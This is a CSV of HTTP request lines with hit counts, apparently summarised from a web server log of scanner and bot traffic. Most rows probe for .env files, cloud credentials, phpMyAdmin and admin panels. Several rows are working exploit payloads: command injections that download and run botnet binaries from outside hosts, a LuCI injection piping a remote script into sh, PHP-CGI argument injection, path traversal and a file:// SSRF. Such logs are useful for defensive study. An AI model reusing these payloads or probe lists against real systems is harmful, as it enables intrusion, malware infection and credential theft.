url,count
POST /.env.old HTTP/1.1,8
GET /sources/.env HTTP/1.1,8
GET /console HTTP/1.1,8
GET /rest/.env HTTP/1.1,8
GET /enviroments/.env HTTP/1.1,8
POST /dvr/cmd HTTP/1.1,8
POST /enviroments/.env HTTP/1.1,8
POST /cgi-bin/ViewLog.asp HTTP/1.1,8
POST /.env.prod HTTP/1.1,8
POST /local/.env HTTP/1.1,8
POST /system/.env HTTP/1.1,8
POST /back/.env HTTP/1.1,8
POST /cms/.env HTTP/1.1,8
GET /back/.env HTTP/1.1,8
POST /sources/.env HTTP/1.1,8
POST /development/.env HTTP/1.1,8
POST /.env.save HTTP/1.1,8
POST /.env.production HTTP/1.1,8
GET /config/aws.yml HTTP/1.1,7
GET /vendor/.env HTTP/1.1,7
GET /public/.env HTTP/1.1,7
GET /aws.yml HTTP/1.1,7
GET /app-ads.txt HTTP/1.1,7
GET /ads.txt HTTP/1.1,7
GET /aaa9 HTTP/1.1,7
HEAD / HTTP/1.1,7
POST /HNAP1/ HTTP/1.1,7
POST /admin-app/.env HTTP/1.1,7
GET /sellers.json HTTP/1.1,7
GET /admin-app/.env HTTP/1.1,7
POST /.env.project HTTP/1.1,7
POST /shared/.env HTTP/1.1,7
GET /wp-json HTTP/1.1,7
POST /apps/.env HTTP/1.1,7
GET /live_env HTTP/1.1,7
POST /live_env HTTP/1.1,7
POST /app/.env HTTP/1.1,7
POST /.env.development HTTP/1.1,7
GET /.env.project HTTP/1.1,7
POST /laravel/.env HTTP/1.1,7
GET /license.txt HTTP/1.1,7
GET /conf/.env HTTP/1.1,6
GET /.aws/credentials HTTP/1.1,6
GET /nacos/v1/console/namespaces HTTP/1.1,6
GET /old/.env HTTP/1.1,6
GET /aspera/faspex/ HTTP/1.1,6
GET /backend/.env HTTP/1.1,6
GET /new/.env HTTP/1.1,6
GET /crm/.env HTTP/1.1,6
GET /storage/.env HTTP/1.1,5
GET /owncloud/status.php HTTP/1.1,5
CONNECT api.ip.pn:443 HTTP/1.1,5
GET /static/admin/javascript/hetong.js HTTP/1.1,5
GET /status.php HTTP/1.1,5
GET /Public/home/js/check.js HTTP/1.1,5
HEAD /invoker/JMXInvokerServlet HTTP/1.1,5
POST /GponForm/diag_Form?images/ HTTP/1.1,5
GET /server-status HTTP/1.1,5
GET /index.jsp HTTP/1.1,5
HEAD /web-console/ServerInfo.jsp HTTP/1.1,5
GET /wp-content/ HTTP/1.1,5
GET /admin/ HTTP/1.1,5
GET /login.do HTTP/1.1,5
GET /.env.example HTTP/1.1,5
GET /wp-content/.env HTTP/1.1,5
GET /src/.env HTTP/1.1,5
GET /wp-admin/.env HTTP/1.1,5
GET /library/.env HTTP/1.1,5
GET /internal_forms_authentication HTTP/1.1,5
GET /phpinfo HTTP/1.1,5
GET /config.js HTTP/1.1,4
GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1,4
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,4
GET /sitecore/shell/sitecore.version.xml HTTP/1.1,4
GET /web/.env HTTP/1.1,4
GET /.env.docker HTTP/1.1,4
GET /cgi/$(ping${IFS}-c1${IFS}194.107.126.7) HTTP/1.1,4
GET /version HTTP/1.1,4
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0,4
GET /.DS_Store HTTP/1.1,4
GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3 HTTP/1.1,4
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60 HTTP/1.1,4
GET /OA_HTML/AppsLocalLogin.jsp HTTP/1.1,4
GET /solr/ HTTP/1.1,4
GET /login.action HTTP/1.1,4
GET /sugar_version.json HTTP/1.1,4
GET /phpmyadmin/index.php HTTP/1.1,4
PUT /SDK/webLanguage HTTP/1.1,4
GET /showLogin.cc HTTP/1.1,4
GET /identity HTTP/1.1,4
CONNECT myip.wtf:443 HTTP/1.1,4
GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1,4
GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1,4
HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1,4
GET /admin/assets/js/views/login.js HTTP/1.0,4
GET /static/historypage.js HTTP/1.1,4
GET /sendgrid.env HTTP/1.1,4
HEAD /icons/sphere1.png HTTP/1.1,4
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1,4
GET /WebInterface/ HTTP/1.1,4
GET /zabbix/favicon.ico HTTP/1.1,4
GET /favicon-32x32.png HTTP/1.1,4
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1,4
GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1,4
GET /api/session/properties HTTP/1.1,4
GET /cgi-bin/main.pl HTTP/1.1,4
GET /aab8 HTTP/1.1,4
GET /partymgr/control/main HTTP/1.1,4
GET /ext-js/app/common/zld_product_spec.js HTTP/1.1,4
GET /webfig/ HTTP/1.1,4
GET /js/NewWindow_2_all.js HTTP/1.1,4
CONNECT google.com:443 HTTP/1.0,3
GET /.env.dev HTTP/1.1,3
GET /assets/.env HTTP/1.1,3
GET /.env.dev.local HTTP/1.1,3
GET /config.php HTTP/1.1,3
GET /laravel/core/.env HTTP/1.1,3
GET /c/ HTTP/1.1,3
POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1,3
POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+allow_url_include%3Don+%ADd+auto_prepend_file%3Dphp%3A//input HTTP/1.1,3
GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+njvwa4+fnkea7;wget+http:/\/ugh.eye-network.ru/fnkea7;chmod+777+fnkea7;./fnkea7+jaws;rm+-rf+fnkea7;wget+http:/\/ugh.eye-network.ru/wheiuwa4;chmod+777+wheiuwa4;./wheiuwa4+jaws;rm+-rf+wheiuwa4 HTTP/1.1,3
OPTIONS / HTTP/1.1,3
GET /docker-compose.yml HTTP/1.1,3
GET /portal/.env HTTP/1.1,3
GET /settings.py HTTP/1.1,3
GET /wp-config.php HTTP/1.1,3
GET /blog/.env HTTP/1.1,3
GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0,3
GET /config/application.yml HTTP/1.1,3
GET /app/config/.env HTTP/1.1,3
GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,3
GET /audio/.env HTTP/1.1,3
GET /base/.env HTTP/1.1,3
GET /prod/.env HTTP/1.1,3
GET /www/.env HTTP/1.1,3
GET /telescope/requests HTTP/1.1,3
GET /.env.config HTTP/1.1,3
GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+njvwa4+fnkea7;wget+http:/\/fniew.eye-network.ru/fnkea7;chmod+777+fnkea7;./fnkea7+jaws;rm+-rf+fnkea7;wget+http:/\/fniew.eye-network.ru/wheiuwa4;chmod+777+wheiuwa4;./wheiuwa4+jaws;rm+-rf+wheiuwa4 HTTP/1.1,3
GET /css/images/PTZOptics_powerby.png HTTP/1.1,3
OPTIONS / HTTP/1.0,3
GET /.env.template HTTP/1.1,3
GET /dev/.env HTTP/1.1,3
GET /.env.live HTTP/1.1,3
GET /.env.stage HTTP/1.1,3
GET /.env.local HTTP/1.1,3
GET /cgi-bin/.env HTTP/1.1,3
GET /.env.orig HTTP/1.1,2
GET /karma.conf.json HTTP/1.1,2
GET /setup/.env HTTP/1.1,2
GET /swagger.json HTTP/1.1,2
GET /swagger.js HTTP/1.1,2
GET /.env.backup.local HTTP/1.1,2
GET /config/storage.yml HTTP/1.1,2
GET /.env.stage.local HTTP/1.1,2
GET /.env.copy HTTP/1.1,2
GET /.env.deploy HTTP/1.1,2
GET /react/.env HTTP/1.1,2
GET /.env.qa HTTP/1.1,2
GET /.env.testing HTTP/1.1,2
GET /vue/.env HTTP/1.1,2
GET /admin/system/.env HTTP/1.1,2
GET /admin/config/.env HTTP/1.1,2
GET /services/.env HTTP/1.1,2
GET /backend/config/.env HTTP/1.1,2
GET /content/.env HTTP/1.1,2
GET /.env~ HTTP/1.1,2
GET /.env.bk HTTP/1.1,2
GET /backend/config/default.yml HTTP/1.1,2
GET /config/.env HTTP/1.1,2
GET /gatsby-config.js HTTP/1.1,2
CONNECT api.ipify.org:443 HTTP/1.1,2
GET /Lara/.env HTTP/1.1,2
GET /api/v1/.env HTTP/1.1,2
CONNECT web.realsysadm.in:443 HTTP/1.1,2
GET /api/shared/config/config.env HTTP/1.1,2
GET /api/shared/config.env HTTP/1.1,2
GET /config.env HTTP/1.1,2
GET /website/.env HTTP/1.1,2
GET /api/v2/.env HTTP/1.1,2
GET /nuxt/.env HTTP/1.1,2
GET /phpmyadmin/ HTTP/1.1,2
GET /next/.env HTTP/1.1,2
GET /s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1,2
GET /controller/api/post.js HTTP/1.1,2
GET /api/shared/.env HTTP/1.1,2
GET /api/config.env HTTP/1.1,2
GET /.env.development.local HTTP/1.1,2
GET /controllers/settings.js HTTP/1.1,2
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1,2
GET /idx_config/ HTTP/1.1,2
GET /actuator/ HTTP/1.1,2
GET /api/geojson?url=file:///etc/hosts HTTP/1.1,2
GET /.env.prod.local HTTP/1.1,2
POST /cn/cmd HTTP/1.1,2
GET /.env_1 HTTP/1.1,2
GET /d/js/ad/page_03.js HTTP/1.1,2
GET /backend/config/development.yml HTTP/1.1,2
GET /controller/admin/post.js HTTP/1.1,2
GET /configs/s3_config.json HTTP/1.1,2
GET /configs/routes.js HTTP/1.1,2
GET /.env.debug HTTP/1.1,2
GET /configs/routes-4aug.js HTTP/1.1,2
GET /.env.tmp HTTP/1.1,2
GET /.env.production.local HTTP/1.1,2
GET /_phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /.env.settings HTTP/1.1,2
GET /.env.preview HTTP/1.1,2
GET /kyc/.env HTTP/1.1,2
GET /.env.secure HTTP/1.1,2
GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1,2
GET /env.template HTTP/1.1,2
GET /symfony/.env HTTP/1.1,2
GET /django/.env HTTP/1.1,2
GET /flask/.env HTTP/1.1,2
GET /cloud/Scraper.js HTTP/1.1,2
GET /.env.backup HTTP/1.1,2
GET /.env.swp HTTP/1.1,2
GET /__phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /.env.override HTTP/1.1,2
GET /style.php HTTP/1.1,2
GET /.env.private HTTP/1.1,2
GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1,2
GET /_phpMyAdmin/index.php?lang=en HTTP/1.1,2
GET /.vscode/sftp.json HTTP/1.1,2
GET /php-myadmin/index.php?lang=en HTTP/1.1,2
HEAD http://112.124.42.80:63435/ HTTP/1.1,2
GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1,2
GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1,2
GET /program/index.php?lang=en HTTP/1.1,2
GET /db/phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1,2
CONNECT httpbin.org:443 HTTP/1.1,2
GET /.env.test HTTP/1.1,2
GET /app.js HTTP/1.1,2
GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /HNAP1/ HTTP/1.1,2
GET /sql/sqladmin/index.php?lang=en HTTP/1.1,2
GET /mysql/db/index.php?lang=en HTTP/1.1,2
GET /.env.staging HTTP/1.1,2
GET /phpmy-admin/index.php?lang=en HTTP/1.1,2
GET /db.json HTTP/1.1,2
GET /phpmyadmin2019/index.php?lang=en HTTP/1.1,2
GET /sql/myadmin/index.php?lang=en HTTP/1.1,2
GET http://httpbin.org/ip HTTP/1.1,2
GET /phpMyAdmin-5.2.1/index.php?lang=en HTTP/1.1,2
GET /admin/web/index.php?lang=en HTTP/1.1,2
CONNECT github.com:443 HTTP/1.1,2
GET /db/db-admin/index.php?lang=en HTTP/1.1,2
GET /sftp-config.json HTTP/1.1,2
GET /db/dbweb/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1,2
GET /api/shared/config/.env HTTP/1.1,2
GET /.env.example.local HTTP/1.1,2
GET /beta/.env HTTP/1.1,2
GET /.env_sample HTTP/1.1,2
GET /production/.env HTTP/1.1,2
GET /app.py HTTP/1.1,2
GET /admin/controllers/merchant.js HTTP/1.1,2
GET /admin/controllers/partner.js HTTP/1.1,2
GET /phpMyAdmin-5.2.1-all-languages/index.php?lang=en HTTP/1.1,2
GET /api/config.js HTTP/1.1,2
GET /api/objects/codes.php.save HTTP/1.1,2
GET /staging/.env HTTP/1.1,2
GET /apis/config/config.js HTTP/1.1,2
GET /apis/controllers/users.js HTTP/1.1,2
GET /.env.save.1 HTTP/1.1,2
GET /db/dbadmin/index.php?lang=en HTTP/1.1,2
GET /connector_server/ HTTP/1.1,2
GET /cgi-bin/luci/ HTTP/1.1,2
GET /admin/sqladmin/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin_/index.php?lang=en HTTP/1.1,2
GET /2phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /php-my-admin/index.php?lang=en HTTP/1.1,2
GET /sql/sql/index.php?lang=en HTTP/1.1,2
GET /mysqlmanager/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin5/index.php?lang=en HTTP/1.1,2
GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1,2
GET /mysql/dbadmin/index.php?lang=en HTTP/1.1,2
GET /sql/sql-admin/index.php?lang=en HTTP/1.1,2
POST /xmlrpc.php HTTP/1.1,2
GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1,2
GET /1phpmyadmin/index.php?lang=en HTTP/1.1,2
GET /configuration.php HTTP/1.1,2
GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1,2
GET /Kingston HTTP/1.1,2
GET /sql/websql/index.php?lang=en HTTP/1.1,2
GET /db/myadmin/index.php?lang=en HTTP/1.1,2
GET /db/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin4/index.php?lang=en HTTP/1.1,2
GET /admin/pma/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin6/index.php?lang=en HTTP/1.1,2
GET /administrator/db/index.php?lang=en HTTP/1.1,2
GET /administrator/web/index.php?lang=en HTTP/1.1,2
GET /phpmy/index.php?lang=en HTTP/1.1,2
GET /administrator/admin/index.php?lang=en HTTP/1.1,2
GET /sql/php-myadmin/index.php?lang=en HTTP/1.1,2
GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1,2
GET /pma/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin2022/index.php?lang=en HTTP/1.1,2
GET /phpMyadmin/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.2.1-english/index.php?lang=en HTTP/1.1,2
GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1,2
POST /login/login.jsp HTTP/1.1,2
POST /index.jsp HTTP/1.1,2
POST /login.do HTTP/1.1,2
POST /login.jsp HTTP/1.1,2
POST /main.jsp HTTP/1.1,2
POST /default.jsp HTTP/1.1,2
POST /register.jsp HTTP/1.1,2
POST /login/indexAction.action HTTP/1.1,2
GET /actuator/env HTTP/1.1,2
POST /indexAction.action HTTP/1.1,2
GET /pmd/index.php HTTP/1.1,2
GET /phpmyadmin4.8.5/index.php HTTP/1.1,2
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F154.216.17.126%2Fl+-O-+%7C+sh%60) HTTP/1.1,2
GET /auth.html HTTP/1.1,2
GET /database/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin2021/index.php?lang=en HTTP/1.1,2
POST /login.action HTTP/1.1,2
GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin5/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin2/index.php?lang=en HTTP/1.1,2
GET /sql/phpmanager/index.php?lang=en HTTP/1.1,2
GET /mysql/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin2/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1,2
GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin1/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1,2
GET /sql/webdb/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin2018/index.php?lang=en HTTP/1.1,2
GET /phpMyAdmin6/index.php?lang=en HTTP/1.1,2
GET /phpmyadmin3/index.php?lang=en HTTP/1.1,2
